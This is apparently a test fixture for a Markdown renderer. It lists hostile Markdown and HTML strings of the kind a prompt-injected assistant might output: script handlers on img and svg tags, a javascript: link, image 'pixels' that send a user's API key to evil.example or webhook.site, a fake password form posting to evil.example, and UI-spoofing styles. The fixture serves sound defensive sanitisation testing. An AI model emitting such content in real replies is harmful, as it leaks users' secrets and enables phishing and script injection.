/** Hostile Markdown of the kind a prompt-injected agent produces. Markers only, no real payloads. */
export const VECTORS = [
  '# Assistant reply',
  'Here is what I found. <img src="/nonexistent.png" onerror="window.__pwned.onerror = true">',
  '<svg onload="window.__pwned.svg = true"><circle r="1"/></svg>',
  '[Open your settings](javascript:window.__pwned.link%20=%20true)',
  '![tracking pixel](https://evil.example/leak.png?conversation=the%20user%27s%20API%20key)',
  '![another pixel](https://webhook.site/abc-123/leak.png)',
  '<form action="https://evil.example/login"><label>Session expired. Password: <input type="password" name="p"></label><button>Sign in</button></form>',
  '<style>h1 { color: red }</style>',
  '<p style="position:fixed;right:1rem;bottom:1rem;background:#ff0;padding:1rem">I look like host UI</p>',
  '```js\nconst html = "<img src=x onerror=alert(1)>";\n```',
  'A normal [link](https://example.com/docs "docs") and a same-origin image: ![ok](/demo/ok.svg)',
];
